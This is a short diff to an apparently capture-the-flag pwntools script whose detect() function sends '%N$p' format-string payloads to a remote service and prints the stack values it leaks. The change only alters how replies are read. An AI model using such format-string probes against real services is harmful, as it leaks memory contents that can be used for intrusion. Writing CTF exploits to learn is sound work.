@@ -10,7 +10,7 @@ def detect(io):
 		io.sendline('2')
 		io.recvuntil('Red or Green Kryptonite?')
 		io.sendline('%'+str(i+1)+'$p')
-		buf = io.recvline().strip()
+		buf = io.recvuntil('\n').strip()
 		print str(i+1)+' : '+buf
 
 ip, port = '142.93.34.45', 30123
